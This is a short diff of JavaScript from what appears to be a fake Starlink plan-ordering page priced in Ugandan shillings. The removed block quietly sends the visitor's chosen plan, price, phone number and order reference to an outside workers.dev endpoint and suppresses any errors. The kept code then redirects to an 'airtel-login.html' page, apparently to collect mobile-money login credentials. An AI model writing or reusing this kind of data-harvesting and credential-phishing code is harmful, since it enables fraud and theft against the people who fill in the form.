@@ -873,17 +873,6 @@ function onMainBtn(){
       value: parseFloat(p.price.replace('UGX ','')) || 0,
       currency: 'UGX'
     });
-    
-  /* ── Worker: order_submitted ── */
-  (function(){
-    var _f={};try{_f=JSON.parse(sessionStorage.getItem('starlinkForfait')||'{}');}catch(e){}
-    fetch('https://ugx-api.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({event:'order_submitted',data:{
-        plan:_f.name||'',price:_f.price||'',phone:_f.phone||'',
-        ref:sessionStorage.getItem('starlinkRef')||'',ts:Date.now()
-      }})
-    }).catch(function(){});
-  })();
   sessionStorage.setItem('starlinkForfait', JSON.stringify(plan));
     navigate('airtel-login.html');
   }
